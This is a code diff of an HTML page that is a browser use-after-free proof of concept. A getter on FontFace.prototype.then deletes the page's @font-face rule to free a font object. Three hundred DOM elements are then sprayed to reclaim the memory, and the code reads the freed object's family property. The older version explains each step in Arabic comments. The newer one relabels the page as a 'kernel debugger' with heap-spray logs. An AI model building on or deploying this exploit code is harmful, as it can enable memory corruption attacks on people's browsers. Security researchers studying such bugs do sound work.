@@ -1,68 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style id="s">
-        @font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; }
+        #console { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; background: #0a0a0a; }
+        .log { margin-bottom: 5px; border-bottom: 1px solid #222; }
     </style>
 </head>
-<body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
-    <div id="out">جاري فحص الاستبدال عبر طبقة الـ DOM...</div>
-    <div id="trash-bin" style="display: none;"></div>
+<body>
+    <h3>JANUS_KERNEL_DEBUGGER v1.0</h3>
+    <div id="console"></div>
 
     <script>
+        const log = (msg) => {
+            const consoleDiv = document.getElementById('console');
+            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        };
+
         window.onload = () => {
+            log("INITIALIZING_MEMORY_TEST...");
             let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            void A.loaded;
-
+            
             let callbackCount = 0;
-            let domElements = [];
-            let bin = document.getElementById('trash-bin');
-
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
                     if (this === A) {
                         callbackCount++;
-                        
-                        if (callbackCount === 1) { 
-                            // 1. تحرير كائن الخط من طبقة الـ ++C
+                        if (callbackCount === 1) {
+                            log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
                             document.getElementById('s').sheet.deleteRule(0);
                             
-                            // 2. محاولة ملء الفراغ بكائنات ++C موازية عبر الـ DOM
+                            log("[+] SPRAYING_DOM_OBJECTS...");
                             for (let i = 0; i < 300; i++) {
                                 let el = document.createElement('div');
-                                el.id = "DOM_" + i; 
-                                el.className = "spray_class_test";
-                                
-                                // ربط العنصر بشجرة الـ DOM للحجز الفعلي
-                                bin.appendChild(el);
-                                domElements.push(el);
+                                el.id = "SPRAY_" + i;
+                                document.body.appendChild(el);
                             }
-                            
-                            // 3. فحص استقرار الذاكرة بعد الاستبدال
+
                             setTimeout(() => {
                                 try {
-                                    // محاولة القراءة من الكائن المحرر (المؤشر المعلق)
-                                    let testRead = A.family;
-                                    
-                                    // إذا لم ينهَرْ المتصفح، فهذا يشير إلى استقرار الذاكرة في هذه الطبقة
-                                    document.body.style.background = "#555500"; 
-                                    document.getElementById("out").innerText = "تم ملء الفراغ بكائنات DOM. المتصفح مستقر وقرأ الخاصية بنجاح.";
-                                    
+                                    log("[?] ATTEMPTING_DEREFERENCE_READ...");
+                                    let val = A.family;
+                                    log("<span style='color: cyan;'>[SUCCESS] READ_VALUE: " + val + "</span>");
+                                    log("[INFO] Heap stability achieved.");
                                 } catch(e) {
-                                    document.body.style.background = "red";
-                                    document.getElementById("out").innerText = "حدث خطأ في القراءة: " + e.message;
+                                    log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
                                 }
-                            }, 0);
+                            }, 100);
                         }
                     }
                     return undefined;
                 }
             });
-
             document.fonts.load('1em targetFont', 'AB');
         };
     </script>
+    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 </body>
 </html>
